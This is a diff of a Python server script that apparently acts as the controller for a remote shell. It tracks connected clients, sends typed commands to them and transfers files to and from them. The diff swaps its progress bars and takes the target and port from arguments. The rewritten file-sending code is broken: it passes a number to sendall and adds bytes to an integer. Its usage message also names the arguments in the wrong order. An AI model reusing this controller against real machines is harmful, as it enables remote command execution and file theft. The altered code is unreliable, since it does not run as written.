@@ -3,6 +3,7 @@ import socket
 import sys
 import threading
 from tqdm import tqdm
+from rich.progress import Progress
 
 # store list of connected clients
 connected_clients = []
@@ -17,9 +18,8 @@ def handle_client(client_sock):
 
     while True:
         # my terminal kinda
-        # display the cwd of the client on terminal
-        cwd=client_sock.recv(1046).decode()
-        command = input(f"{cwd}: ")
+        cwd = client_sock.recv(1046).decode()
+        command = input(f'{cwd}: ')
         if command == "exit":
             client_sock.send(b'closed')
             client_sock.close()
@@ -46,7 +46,6 @@ def handle_client(client_sock):
             print(f'Connected clients: {len(connected_clients)}')
             for i, client in enumerate(connected_clients, 1):
                 print(f'client {i}: {client.getpeername()}')
-
         elif command.strip():
             try:
                 client_sock.send(command.encode())
@@ -65,28 +64,27 @@ def receive_files(sock, filename):
     # receive file size of the target file to be acquired
     file_size = int(sock.recv(4096).decode().strip())
     print(f' the size of the file to receive is {file_size} bytes')
-
-    # set the progress bar with the total file size gotten
-    progress = tqdm(total=file_size, desc=f'downloading {filename}',
-                    unit='B',
-                    unit_scale=False,
-                    unit_divisor=1024
-                    )
     try:
+
         with open(filename, 'wb') as file:
             total_received = 0
-            while total_received < file_size:
-                # recv  the file in chunks
-                data = sock.recv(min(4096, file_size - total_received))
-                # dubugging purposes
-                # print(f'{total_received} bytes')
-                if not data:
-                    print("nothing to send again")
-                    break
-                file.write(data)
-                total_received += len(data)
-                progress.update((len(data)))
-        progress.close()
+
+            with Progress() as progress:
+                task = progress.add_task("[green]Downloading file...", total=file_size)
+
+                while total_received <= file_size:
+                    # recv  the file in chunks
+                    data = sock.recv(min(4096, file_size - total_received))
+                    # dubugging purposesls
+                    if not data:
+                        print("nothing to send again")
+                        break
+
+                    file.write(data)
+                    total_received += len(data)
+                    print(f'{total_received} bytes')
+                    progress.update(task, advance=len(data))
+
     except FileNotFoundError as e:
         print(f'{e} not found')
 
@@ -94,26 +92,21 @@ def receive_files(sock, filename):
 def send_files(sock, filename):
     # get size of target file
     file_size = os.path.getsize(filename)
-    # returned value is an int
-    
     sock.sendall(f'{file_size}'.encode())
     # set progress bar
-    progress = tqdm(total=file_size, desc=f'sending {filename}',
-                    unit='B',
-                    unit_scale=False,
-                    unit_divisor=1024)
     try:
         with open(filename, 'rb') as file:
-            while True:
-                data = file.read(4096)
-                if not data:
-                    break
-                file_size_sent = 0
-                while file_size_sent < file_size:
-                    sock.sendall(data)
-                    file_size_sent += len(data)
-                    progress.update((len(data)))
-            progress.close()
+            total_sent = 0
+            with Progress() as progress:
+                task = progress.add_task("[green] sending file......", total=file_size)
+                while True:
+                    data = file.read(4096)
+                    if not data:
+                        break
+                    while total_sent <= file_size:
+                        sock.sendall(min(4096,file_size-total_sent))
+                        total_sent += data
+                        progress.update(task, advance=len(data))
     except FileNotFoundError as e:
         print(f'not found {e}')
     except Exception as e:
@@ -122,8 +115,13 @@ def send_files(sock, filename):
 
 def server():
     # define connection parameters
-    port = 8080
-    target = "127.0.0.1"
+
+    if len(sys.argv) < 3:
+        print('please enter a valid parameter in this order <script> <port> <target> ')
+        sys.exit(1)
+
+    target = sys.argv[1]
+    port = int(sys.argv[2])
 
     # set socket option
     try:
